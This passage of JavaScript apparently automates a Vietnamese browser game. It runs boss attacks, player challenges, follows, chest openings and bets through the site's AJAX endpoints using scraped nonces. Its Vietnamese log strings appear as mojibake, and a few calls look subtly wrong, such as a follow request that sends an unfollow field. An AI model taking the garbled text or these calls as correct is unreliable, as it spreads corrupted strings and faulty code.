            if (remaining === 0) return logger.log(`üü¢ [Hoang V·ª±c] - ƒê√£ ho√†n th√†nh.`)
            const distance = await this.getNextAttackTime()
            if (distance === null || distance > 0) return logger.log(`üü° [Hoang V·ª±c] - Ch∆∞a ƒë·∫øn th·ªùi gian ƒë√°nh - C√≤n l·∫°i ${remaining} l∆∞·ª£t.`)
            const bossId = page.html.match(/boss_id\s*==\s*"(\d+)"/)?.[1]
            await this.attackBoss(nonce, bossId, remaining)
        } catch (error) {
            console.log(`üî¥ [Hoang V·ª±c] - L·ªói "trigger": ${error.message}`)
        }
    }

    async claimChest(nonce) {
        if (!nonce) return console.log(`üî¥ [Hoang V·ª±c] - Kh√¥ng t√¨m th·∫•y nonce claim_chest.`)
        const result = await postRequest(ADMIN_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'claim_chest', nonce })
        })
        if (result.error) return logger.log(`‚ùå [Hoang V·ª±c] - ${result.error}`)
        logger.log(`‚úÖ [Hoang V·ª±c] - Nh·∫≠n th∆∞·ªüng th√†nh c√¥ng.`)
        const rewards = result.total_rewards || {}
        const rewardLogs = []
        if (rewards.tu_vi) rewardLogs.push(`‚ú® Tu Vi: ${rewards.tu_vi}`)
        if (rewards.tinh_thach) rewardLogs.push(`üíé Tinh Th·∫°ch: ${rewards.tinh_thach}`)
        if (rewards.tinh_huyet) rewardLogs.push(`ü©∏ Tinh Huy·∫øt: ${rewards.tinh_huyet}`)
        if (rewards.tien_ngoc) rewardLogs.push(`üîÆ Ti√™n Ng·ªçc: ${rewards.tien_ngoc}`)
        if (rewardLogs.length) logger.log(rewardLogs.join(' | '))
    }

    async getNextAttackTime() {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_next_attack_time' })
        })
        if (result?.success && typeof result?.data === 'number') {
            const now = new Date().getTime()
            const distance = result.data - now
            return distance
        }
        return null
    }

    async attackBoss(nonce, bossId, remaining) {
        if (!nonce) return console.log(`üî¥ [Hoang V·ª±c] - Kh√¥ng t√¨m th·∫•y nonce attack_boss.`)
        if (!bossId) return console.log(`üî¥ [Hoang V·ª±c] - Kh√¥ng t√¨m th·∫•y bossId attack_boss.`)
        const requestId = 'req_' + Math.random().toString(36).slice(2, 11) + '_' + Date.now()
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'attack_boss', boss_id: bossId, nonce, request_id: requestId })
        })
        const message = result?.success === true
            ? `üü¢ [Hoang V·ª±c] - T·∫•n c√¥ng th√†nh c√¥ng - C√≤n l·∫°i ${remaining - 1} l∆∞·ª£t.`
            : `üî¥ [Hoang V·ª±c] - T·∫•n c√¥ng th·∫•t b·∫°i - ${result?.data?.error}`
        logger.log(message)
    }
}

class LuanVo {
    constructor(page = null) {
        this.page = page
        this.battleData = null
    }

    async triggerReceive(isOn = true) {
        try {
            if (this.battleData === null) this.battleData = await this.prepareTrigger()
            if (this.battleData === null || this.battleData.reward) return
            if (this.battleData.received >= 5) return logger.log(`üü° [Lu·∫≠n V√µ] - ƒê√£ nh·∫≠n t·ªëi ƒëa.`)
            const receivedBadgeValue = parseInt(this.page.doc.querySelector('#ViewReceivedChallengesBtn .notification-badge')?.textContent.trim() || '0')
            if (isOn && receivedBadgeValue > 0) {
                await this.rejectAllReceivedChallenges()
            }
            if (this.battleData.isAutoOn !== isOn) {
                await this.toggleAutoAccept(isOn)
            } else {
                logger.log(`üü¢ [Lu·∫≠n V√µ] - ƒêang ${isOn ? 'b·∫≠t' : 't·∫Øt'} t·ª± ƒë·ªông khi√™u chi·∫øn.`)
            }
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "triggerReceive": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async triggerSend({ following = true, online = false, retries = 3 } = {}) {
        try {
            if (this.battleData === null) this.battleData = await this.prepareTrigger()
            if (this.battleData === null || this.battleData.reward) return
            if (this.battleData.sent >= 5) return logger.log(`üü¢ [Lu·∫≠n V√µ] - ƒê√£ g·ª≠i t·ªëi ƒëa.`)
            await this.loadPageIfNeeded()
            const sentBadgeValue = parseInt(this.page.doc.querySelector('#ViewSentChallengesBtn .notification-badge')?.textContent.trim() || '0')
            if (sentBadgeValue > 0) {
                await this.rejectAllSentChallenges()
            }
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            let users = []
            let targetUsers
            if (following) {
                users = await this.getUsers({ action: '/get-following-users', nonce: variableJSON.nonce, loadmore: true })
                targetUsers = users.filter(user => user.challenges_remaining > 0)
            } else if (online) {
                users = await this.getUsers({ action: '/online-users', nonce: variableJSON.nonce, loadmore: false })
                targetUsers = users.filter(user => user.auto_accept && user.challenges_remaining > 0)
            } else {
                return logger.log(`üü° [Lu·∫≠n V√µ] - Ch∆∞a ho√†n th√†nh g·ª≠i khi√™u chi·∫øn.`)
            }
            let index = 0
            while (index < targetUsers.length && this.battleData.sent < 5) {
                const target = targetUsers[index]
                if (!target.auto_accept) {
                    index++
                    continue
                }
                if (target.challenges_remaining < 1) {
                    targetUsers.splice(index, 1)
                    continue
                }
                const sentData = await this.sendChallenge(target, variableJSON.nonce)
                if (typeof sentData === 'string' && sentData.toLowerCase().includes('t·ªëi ƒëa')) {
                    if (sentData.toLowerCase().includes('nh·∫≠n t·ªëi ƒëa')) {
                        targetUsers.splice(index, 1)
                        continue
                    }
                    console.log(`üü° [Lu·∫≠n V√µ] - ƒê√£ g·ª≠i t·ªëi ƒëa - ${sentData}`)
                    await this.loadPageIfNeeded(true)
                    this.battleData = await this.prepareTrigger()
                    return
                }
                if (typeof sentData === 'object' && sentData !== null) {
                    const sentResult = await this.approveChallenge(sentData, variableJSON.nonce)
                    if (!sentResult) {
                        targetUsers.splice(index, 1)
                        continue
                    }
                    let remaining = parseInt(sentResult?.received_remaining, 10) || 0
                    target.challenges_remaining = Math.min(target.challenges_remaining - 1, remaining)
                    this.battleData.sent++
                } else {
                    targetUsers.splice(index, 1)
                }
                if (index < targetUsers.length && this.battleData.sent < 5) await sleep(5000)
            }
            if (this.battleData.sent >= 5) {
                await this.loadPageIfNeeded(true)
                this.battleData = await this.prepareTrigger()
                return console.log(`üü¢ [Lu·∫≠n V√µ] - ƒê√£ g·ª≠i t·ªëi ƒëa.`)
            }
            if (!targetUsers.length && retries > 0) return this.triggerSend({ following: false, online: true, retries: retries - 1 })
            logger.log(`üü° [Lu·∫≠n V√µ] - Ch∆∞a ho√†n th√†nh g·ª≠i khi√™u chi·∫øn.`)
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "triggerSend": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async rejectAllReceivedChallenges() {
        const { challenges, nonce } = await this.getReceivedChallenges()
        for (const challenge of challenges) {
            await this.rejectReceivedChallenge(challenge, nonce)
        }
    }

    async rejectAllSentChallenges() {
        const { challenges, nonce } = await this.getSentChallenges()
        for (const challenge of challenges) {
            await this.rejectSentChallenge(challenge, nonce)
        }
    }

    async prepareTrigger() {
        const getValue = (label, doc) => {
            const p = Array.from(doc.querySelectorAll('p')).find(p => p.textContent.trim().startsWith(label))
            const text = p?.querySelector('span.highlight')?.textContent || ''
            const match = text.match(/^(\d+)/)
            return match ? parseInt(match[1]) : 0
        }

        await this.loadPageIfNeeded()
        if (this.page.doc.getElementById('joinBattleImg')) {
            if (await this.joinBattle()) {
                this.page = await loadPage(DOMAIN + '/luan-vo-duong')
            } else {
                return null
            }
        }
        const sent = getValue('ƒê√£ g·ª≠i:', this.page.doc)
        const received = getValue('ƒê√£ nh·∫≠n:', this.page.doc)
        const isAutoOn = !!this.page.doc.getElementById('auto_accept_toggle')?.checked
        let reward = false
        if (sent >= 5 && received >= 5) {
            const rewardBtn = this.page.doc.getElementById('receive-reward-btn')
            const nonce = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig').nonce
            if (rewardBtn && nonce) {
                reward = await this.receiveReward(nonce)
            } else {
                logger.log(`üü¢ [Lu·∫≠n V√µ] - ƒê√£ nh·∫≠n th∆∞·ªüng.`)
                reward = true
            }
        }
        return { sent, received, isAutoOn, reward }
    }

    async loadPageIfNeeded(force = false) {
        if (!this.page || force) this.page = await loadPage(DOMAIN + '/luan-vo-duong')
    }

    async getUsers({ action, nonce, page = 1, current = [], loadmore, maxPages = 10 }) {
        try {
            if (!nonce) {
                console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce ${action}.`)
                return []
            }
            const result = await postRequest(LUANVO_URL + action, {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
                body: JSON.stringify({ page })
            })
            const { success, data } = result || {}
            const { users, load_more } = data || {}
            if (!success || !users) return current
            const allUsers = [...current, ...users]
            if (load_more === true && loadmore) {
                if (page >= maxPages) {
                    return allUsers
                }
                return await this.getUsers({ action, nonce, page: page + 1, current: allUsers, loadmore: true })
            }
            return allUsers
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "getUsers": ${error.message}`)
            return current
        }
    }

    async getReceivedChallenges() {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            const nonce = variableJSON.nonce
            if (!nonce) {
                console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce get_received_challenges.`)
                return { challenges: [], nonce: null }
            }
            const result = await postRequest(LUANVO_URL + '/get-received-challenges', {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
            })
            if (!result?.success || !result.data?.html) {
                console.log(`üî¥ [Lu·∫≠n V√µ] - Ph·∫£n h·ªìi kh√¥ng h·ª£p l·ªá t·ª´ get_received_challenges.`)
                return { challenges: [], nonce }
            }
            const doc = new DOMParser().parseFromString(result.data.html, 'text/html')
            const challenges = Array.from(doc.querySelectorAll('tbody tr')).map(row => {
                const request = row.querySelector('.approve-request')
                const name = row.querySelector('.challenger-name')?.textContent.trim() || ''
                const target_user_id = request?.getAttribute('data-user-id').trim() || ''
                const challenge_id = request?.getAttribute('data-challenge-id').trim() || ''
                return { name, target_user_id, challenge_id }
            }).filter(challenge => challenge.target_user_id && challenge.challenge_id)
            return { challenges, nonce }
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "getReceivedChallenges": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async getSentChallenges() {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            const nonce = variableJSON.nonce
            if (!nonce) {
                console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce get-sent-challenges.`)
                return { challenges: [], nonce: null }
            }
            const result = await postRequest(LUANVO_URL + '/get-sent-challenges', {
                headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
            })
            if (!result?.success || !result.data?.html) {
                console.log(`üî¥ [Lu·∫≠n V√µ] - Ph·∫£n h·ªìi kh√¥ng h·ª£p l·ªá t·ª´ get-sent-challenges.`)
                return { challenges: [], nonce }
            }
            const doc = new DOMParser().parseFromString(result.data.html, 'text/html')
            const challenges = Array.from(doc.querySelectorAll('tbody tr')).map(row => {
                const request = row.querySelector('.reject-request')
                const name = row.querySelector('.challenger-name')?.textContent.trim() || ''
                const target_user_id = request?.getAttribute('data-user-id').trim() || ''
                const challenge_id = request?.getAttribute('data-challenge-id').trim() || ''
                return { name, target_user_id, challenge_id }
            }).filter(challenge => challenge.target_user_id && challenge.challenge_id)
            return { challenges, nonce }
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "getSentChallenges": ${error.message}`)
            return { challenges: [], nonce: null }
        }
    }

    async rejectReceivedChallenge(challenge, nonce) {
        if (!nonce) return console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce reject-challenge`)
        const result = await postRequest(LUANVO_URL + '/reject-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true
            ? `‚úÖ [Lu·∫≠n V√µ] - T·ª´ ch·ªëi th√†nh c√¥ng y√™u c·∫ßu c·ªßa ${challenge.name} (${challenge.target_user_id})`
            : `‚ùå [Lu·∫≠n V√µ] - T·ª´ ch·ªëi th·∫•t b·∫°i y√™u c·∫ßu c·ªßa ${challenge.name} (${challenge.target_user_id})`
        logger.log(message)
    }

    async rejectSentChallenge(challenge, nonce) {
        if (!nonce) return console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce cancel-challenge`)
        const result = await postRequest(LUANVO_URL + '/cancel-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true
            ? `‚úÖ [Lu·∫≠n V√µ] - Hu·ª∑ th√†nh c√¥ng y√™u c·∫ßu ƒë·∫øn ${challenge.name} (${challenge.target_user_id})`
            : `‚ùå [Lu·∫≠n V√µ] - Hu·ª∑ th·∫•t b·∫°i y√™u c·∫ßu ƒë·∫øn ${challenge.name} (${challenge.target_user_id})`
        logger.log(message)
    }

    async sendChallenge(user, nonce) {
        if (!nonce) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce send_challenge`)
            return null
        }
        const result = await postRequest(LUANVO_URL + '/send-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: user.id })
        })
        const message = result?.success === true && result.data
            ? `‚öîÔ∏è [Lu·∫≠n V√µ] ƒê√£ g·ª≠i khi√™u chi·∫øn ƒë·∫øn ${user.name} (${user.id})`
            : `‚ùå [Lu·∫≠n V√µ] G·ª≠i khi√™u chi·∫øn kh√¥ng th√†nh c√¥ng ƒë·∫øn ${user.name} (${user.id})`
        logger.log(message)
        return result.data
    }

    async approveChallenge(challenge, nonce) {
        if (!nonce) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce auto-approve-challenge`)
            return null
        }
        const result = await postRequest(LUANVO_URL + '/auto-approve-challenge', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ target_user_id: challenge.target_user_id, challenge_id: challenge.challenge_id })
        })
        const message = result?.success === true && result.data
            ? `‚úÖ [Lu·∫≠n V√µ] G·ª≠i khi√™u chi·∫øn ho√†n th√†nh.`
            : `‚ùå [Lu·∫≠n V√µ] G·ª≠i khi√™u chi·∫øn b·∫•t th√†nh.`
        logger.log(message)
        return result.data
    }

    async joinBattle() {
        await this.loadPageIfNeeded()
        const nonce = parseVariableJSON(this.page.doc, 'better-messages-js-extra', 'Better_Messages').nonce
        if (!nonce) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce join_battle_new.`)
            return false
        }
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce },
            body: JSON.stringify({ action: 'join_battle_new' })
        })
        const message = result?.success === true
            ? `‚úÖ [Lu·∫≠n V√µ] - Tham gia th√†nh c√¥ng.`
            : `‚ùå [Lu·∫≠n V√µ] - Tham gia th·∫•t b·∫°i.`
        logger.log(message)
        return !!result?.success
    }

    async toggleAutoAccept(isOn) {
        await this.loadPageIfNeeded()
        const nonce = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig').nonce
        if (!nonce) return console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce toggle_auto_accept.`)
        const result = await postRequest(LUANVO_URL + '/toggle-auto-accept', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
        })
        const message = result?.success === true
            ? `‚úÖ [Lu·∫≠n V√µ] - ${result.message || ''}`
            : `‚ùå [Lu·∫≠n V√µ] - ${isOn ? 'B·∫≠t' : 'T·∫Øt'} t·ª± ƒë·ªông nh·∫≠n khi√™u chi·∫øn th·∫•t b·∫°i.`
        this.battleData.isAutoOn = message.toLowerCase().includes('b·∫≠t')
        logger.log(message)
    }

    async receiveReward(nonce) {
        if (!nonce) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce receive-reward.`)
            return false
        }
        const result = await postRequest(LUANVO_URL + '/receive-reward', {
            headers: { 'Content-Type': 'application/json', 'x-wp-nonce': nonce }
        })
        const message = result?.success === true
            ? `‚úÖ [Lu·∫≠n V√µ] - Nh·∫≠n th∆∞·ªüng th√†nh c√¥ng - ${result.message}`
            : `‚ùå [Lu·∫≠n V√µ] - Nh·∫≠n th∆∞·ªüng th·∫•t b·∫°i - ${result?.message}`
        logger.log(message)
        return !!result?.success
    }

    async triggerFollow(ids, clean = false) {
        try {
            await this.loadPageIfNeeded()
            const variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            if (clean) {
                const users = await this.getUsers({ action: 'get_following_users', nonce: variableJSON.nonce, loadmore: true })
                const ids = users.map(user => user.id)
                await this.triggerUnfollow(ids, variableJSON)
            }
            const currentId = parseInt(variableJSON.current_user_id)
            if (!variableJSON.nonce) return console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce follow`)
            for (const id of ids) {
                if (id === currentId) continue
                const result = await postRequest(LUANVO_URL + '/follow', {
                    headers: { 'Content-Type': 'application/json', 'x-wp-nonce': variableJSON.nonce },
                    body: JSON.stringify({ unfollow_user_id: id })
                })
                const message = result?.success === true
                    ? `‚úÖ [Lu·∫≠n V√µ] - Theo d√µi th√†nh c√¥ng ID: ${id}`
                    : `‚ùå [Lu·∫≠n V√µ] - Theo d√µi th·∫•t b·∫°i ID: ${id}`
                logger.log(message)
            }
            logger.log(`üü¢ [Lu·∫≠n V√µ] - Ho√†n th√†nh x·ª≠ l√Ω theo d√µi.`)
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "triggerFollow": ${error.message}`)
        }
    }

    async triggerUnfollow(ids, variableJSON = null) {
        try {
            await this.loadPageIfNeeded()
            if (variableJSON === null) variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            if (!variableJSON.nonce) return console.log(`üî¥ [Lu·∫≠n V√µ] - Kh√¥ng t√¨m th·∫•y nonce unfollow`)
            const currentId = parseInt(variableJSON.current_user_id)
            for (let id of ids) {
                if (id === currentId) continue
                const result = await postRequest(LUANVO_URL + '/unfollow', {
                    headers: { 'Content-Type': 'application/json', 'x-wp-nonce': variableJSON.nonce },
                    body: JSON.stringify({ unfollow_user_id: id })
                })
                const message = result?.success === true
                    ? `‚úÖ [Lu·∫≠n V√µ] - H·ªßy theo d√µi th√†nh c√¥ng ID: ${id}`
                    : `‚ùå [Lu·∫≠n V√µ] - H·ªßy theo d√µi th·∫•t b·∫°i ID: ${id}`
                logger.log(message)
            }
            logger.log(`üü¢ [Lu·∫≠n V√µ] - Ho√†n th√†nh x·ª≠ l√Ω h·ªßy theo d√µi.`)
        } catch (error) {
            console.log(`üî¥ [Lu·∫≠n V√µ] - L·ªói "triggerUnfollow": ${error.message}`)
        }
    }
}

class PhucLoiDuong {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/phuc-loi-duong')
            await this.claimBonusReward(page)
            const security = page.html.match(/get_next_time_pl[\s\S]*?security\s*:\s*'([^']+)'/)?.[1]
            const next = await this.getNextTime(security)
            if (next === null) return
            await this.openChest(security, next)
        } catch (error) {
            console.log(`üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - L·ªói "trigger": ${error.message}`)
        }
    }

    async claimBonusReward(page) {
        async function claimRequest(id, security) {
            const result = await postRequest(HH3D_AJAX_URL, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ action: 'claim_bonus_reward', chest_id: id, security })
            })
            logger.log(`${result?.success === true ? '‚úÖ' : '‚ùå'} [Ph√∫c L·ª£i ƒê∆∞·ªùng] - ${result?.data?.message || result}`)
            return !!result?.success
        }

        if (!page) page = await loadPage(DOMAIN + '/phuc-loi-duong')
        const ids = Array.from(page.doc.querySelectorAll('.reward-progress-container .milestone'))
            .map(milestone => {
                const giftBox = milestone.querySelector('.gift-box')
                if (!giftBox) return null
                const classList = giftBox.classList
                const isActive = classList.contains('active')
                const isReceived = classList.contains('received-reward')
                const pointerEvents = (giftBox.getAttribute('style') || '').match(/pointer-events\s*:\s*([a-zA-Z-]+)/)
                const pointerValue = pointerEvents?.[1]?.trim()
                return (isActive && !isReceived && (!pointerValue || pointerValue === 'auto'))
                    ? milestone.getAttribute('data-id')
                    : null
            })
            .filter(Boolean)
        const requestData = parseRequestData(page.html)
        const security = requestData.find(value => value.action === 'claim_bonus_reward')?.security
        if (!security) return console.log(`üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Kh√¥ng t√¨m th·∫•y security claim_bonus_reward.`)
        for (const id of ids) {
            if (await claimRequest(id, security) && Number(id) === 3) {
                return await claimRequest(4, security)
            }
        }
    }

    async getNextTime(security) {
        if (!security) return console.log(`üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Kh√¥ng t√¨m th·∫•y security get_next_time_pl`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_next_time_pl', security })
        })
        const level = parseInt(result?.data?.chest_level, 10)
        const time = result?.data?.time
        if (result?.success === true && !isNaN(level)) {
            if (level === 4) {
                logger.log(`üü¢ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - ƒê√£ m·ªü ƒë·ªß 4 r∆∞∆°ng.`)
            } else if (time !== '00:00') {
                logger.log(`üü° [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Ch∆∞a ƒë·∫øn th·ªùi gian m·ªü | ${time || '--'}`)
            } else {
                return level + 1
            }
        } else {
            return console.log(`üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Kh√¥ng l·∫•y ƒë∆∞·ª£c d·ªØ li·ªáu get_next_time_pl.`)
        }
        return null
    }

    async openChest(security, next) {
        if (!security) return console.log(`üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Kh√¥ng t√¨m th·∫•y security open_chest_pl.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'open_chest_pl', security, chest_id: next })
        })
        const message = result?.success === true
            ? `üü¢ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - R∆∞∆°ng ${next} - ${result.data?.message}`
            : `üî¥ [Ph√∫c L·ª£i ƒê∆∞·ªùng] - Kh√¥ng th√†nh c√¥ng - ${result?.data?.message}`
        logger.log(message)
    }
}

class DoThach {
    constructor(indices, amount = 20) {
        this.indices = indices
        this.amount = amount
    }

    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/do-thach-hh3d')
            const requestData = parseRequestData(page.html)
            const hasGift = page.doc.querySelector('.custom-button.gift-button')
            if (hasGift) await this.giveNewbieGift(requestData)
            const hasReward = page.doc.querySelector('#claim-reward-button')
            if (hasReward) {
                await this.claimDoThachReward(requestData)
                return await this.trigger()
            }
            const stones = await this.loadDoThachData(requestData)
            if (!stones.length) return
            stones.sort((lhs, rhs) => (Number(rhs.reward_multiplier) || 0) - (Number(lhs.reward_multiplier) || 0))
            const placedStones = stones.filter(stone => stone.bet_placed === true)
            const remainingStones = stones.filter((_, index) => this.indices.includes(index + 1) && !placedStones.includes(stones[index]))
            const targetStones = placedStones.concat(remainingStones).slice(0, 2)
            for (const stone of targetStones) {
                if (stone.bet_placed === true) {
                    logger.log(`‚úÖ [ƒê·ªï Th·∫°ch] - ƒê√£ ƒë·∫∑t c∆∞·ª£c v√†o ${stone.name} (x${stone.reward_multiplier})`)
                } else {
                    await this.placeDoThachBet(requestData, stone, this.amount)
                }
            }
        } catch (error) {
            console.log(`üî¥ [ƒê·ªï Th·∫°ch] - L·ªói "trigger": ${error.message}`)
        }
    }

    async giveNewbieGift(requestData) {
        const security = requestData.find(value => value.action === 'give_newbie_gift')?.security
        if (!security) return console.log(`üî¥ [ƒê·ªï Th·∫°ch] - Kh√¥ng t√¨m th·∫•y security give_newbie_gift.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'give_newbie_gift', security })
        })
        const message = result?.success === true
            ? `üü¢ [ƒê·ªï Th·∫°ch] - Nh·∫≠n qu√† t√¢n th·ªß th√†nh c√¥ng`
            : `üî¥ [ƒê·ªï Th·∫°ch] - Nh·∫≠n qu√† t√¢n th·ªß th·∫•t b·∫°i - ${result?.data || result}`
        logger.log(message)
    }

    async claimDoThachReward(requestData) {
        const security = requestData.find(value => value.action === 'claim_do_thach_reward')?.security
        if (!security) return console.log(`üî¥ [ƒê·ªï Th·∫°ch] - Kh√¥ng t√¨m th·∫•y security claim_do_thach_reward.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'claim_do_thach_reward', security })
        })
        const message = result?.success === true
            ? `üü¢ [ƒê·ªï Th·∫°ch] - Nh·∫≠n th∆∞·ªüng th√†nh c√¥ng - ${result?.data?.message}`
            : `üî¥ [ƒê·ªï Th·∫°ch] - ${result?.data?.message || result}`
        logger.log(message)
    }

    async loadDoThachData(requestData) {
        const security = requestData.find(value => value.action === 'load_do_thach_data')?.security
        if (!security) return console.log(`üî¥ [ƒê·ªï Th·∫°ch] - Kh√¥ng t√¨m th·∫•y security load_do_thach_data.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'load_do_thach_data', security })
        })
        const { success, data } = result || {}
        const { stones, is_reward_time, winning_stone_id } = data || {}
        if (!success || !stones) {
            console.log(`üî¥ [ƒê·ªï Th·∫°ch] - Kh√¥ng l·∫•y ƒë∆∞·ª£c d·ªØ li·ªáu load_do_thach_data.`)
            return []
        }
        if (!is_reward_time) return stones
        const sample = {
            stones: stones.map(({ stone_id, name, reward_multiplier, bet_count }) => ({
                stone_id,
                name,
                reward_multiplier,
                bet_count: Number(bet_count)
            })),
            winning_stone_id
        }
        console.log(JSON.stringify(sample, null, 4))
        const rewardStone = stones.find(stone => stone.stone_id == winning_stone_id && stone.bet_placed === true)
        if (!rewardStone) {
            logger.log(`üü° [ƒê·ªï Th·∫°ch] - Kh√¥ng c√≥ th∆∞·ªüng.`)
            return []
        }
        if (rewardStone.reward_claimed === true) {
            logger.log(`üü¢ [ƒê·ªï Th·∫°ch] - ƒê√£ nh·∫≠n th∆∞·ªüng.`)
            return []
        }
        await this.claimDoThachReward(requestData)
        return []
    }

    async placeDoThachBet(requestData, stone) {
        const security = requestData.find(value => value.action === 'place_do_thach_bet')?.security
        if (!security) return console.log(`üî¥ [ƒê·ªï Th·∫°ch] - Kh√¥ng t√¨m th·∫•y security place_do_thach_bet`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'place_do_thach_bet', security, stone_id: stone.stone_id, bet_amount: this.amount })
        })
        const message = result?.success === true
            ? `üü¢ [ƒê·ªï Th·∫°ch] - ƒê·∫∑t c∆∞·ª£c th√†nh c√¥ng - ${stone.name} (x${stone.reward_multiplier}) - ${this.amount} Ti√™n Ng·ªçc`
            : `üî¥ [ƒê·ªï Th·∫°ch] - ƒê·∫∑t c∆∞·ª£c th·∫•t b·∫°i - ${result?.data || result}`
        logger.log(message)
    }
}

class ThiLuyenTongMon {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/thi-luyen-tong-mon-hh3d')
            const security = page.html.match(/get_remaining_time_tltm[\s\S]*?security\s*:\s*'([^']+)'/)?.[1]
            const next = await this.getRemainingTimeTLTM(security)
            if (next === null) return
            if (!security) return console.log(`üî¥ [Th√≠ Luy·ªán T√¥ng M√¥n] - Kh√¥ng t√¨m th·∫•y security open_chest_tltm.`)
            const result = await postRequest(HH3D_AJAX_URL, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ action: 'open_chest_tltm', security })
            })
            const message = result?.success === true
                ? `üü¢ [Th√≠ Luy·ªán T√¥ng M√¥n] - M·ªü th√†nh c√¥ng - ${result.data?.message}`
                : `üü° [Th√≠ Luy·ªán T√¥ng M√¥n] - ${result.data?.message}`
            logger.log(message)
        } catch (error) {
            console.log(`üî¥ [Th√≠ Luy·ªán T√¥ng M√¥n] - L·ªói "trigger": ${error.message}`)
        }
    }

    async getRemainingTimeTLTM(security) {
        if (!security) return console.log(`üî¥ [Th√≠ Luy·ªán T√¥ng M√¥n] - Kh√¥ng t√¨m th·∫•y security get_remaining_time_tltm`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_remaining_time_tltm', security })
        })

        const time = result.data?.time_remaining
        if (result?.success === true) {
